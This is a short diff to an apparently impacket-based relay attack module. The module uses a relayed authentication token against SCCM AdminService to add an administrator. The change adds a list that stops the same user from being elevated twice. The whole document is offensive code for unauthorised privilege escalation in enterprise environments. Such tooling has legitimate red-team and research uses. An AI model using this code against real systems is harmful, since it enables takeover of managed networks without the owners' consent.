@@ -19,11 +19,16 @@ from impacket.spnego import SPNEGO_NegTokenResp
 import json
 import base64
 
+ELEVATED = []
 
 class ADMINSERVICEAttack:
     def _run(self):       
         # slightly modfied sendAuth func from httprelayclient.py reused here due to negotiate auth,
         # requring all action to be performed in one shot
+        if self.username in ELEVATED:
+            LOG.info('Skipping user %s since attack was already performed' % self.username)
+            return
+        
         if unpack('B', self.config.sccmAdminToken[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
             respToken2 = SPNEGO_NegTokenResp(self.config.sccmAdminToken)
             token = respToken2['ResponseToken']
@@ -59,7 +64,7 @@ class ADMINSERVICEAttack:
 
         LOG.info('Adding administrator via SCCM AdminService...')
         self.client.request("POST", '/AdminService/wmi/SMS_Admin', headers=headers, body=body)
-        
+        ELEVATED.append(self.username)
         res = self.client.getresponse()
 
         if res.status == 201:
